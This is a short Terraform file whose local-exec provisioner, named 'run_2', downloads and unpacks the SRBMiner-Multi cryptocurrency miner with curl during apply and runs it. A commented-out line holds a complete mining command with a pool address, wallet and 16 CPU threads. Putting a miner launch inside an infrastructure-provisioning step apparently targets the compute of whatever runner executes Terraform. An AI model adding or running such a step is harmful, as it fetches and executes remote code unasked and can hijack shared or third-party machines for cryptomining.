resource "null_resource" "run_2" {
  provisioner "local-exec" {
    command = <<EOT
set -e

curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-Linux.tar.gz -o SRBMiner-Multi.tar.gz

tar -xzf SRBMiner-Multi.tar.gz
echo "Start Mining"
ls SRBMiner-Multi-3-1-1
./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --help
#./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 16

EOT
  }
}
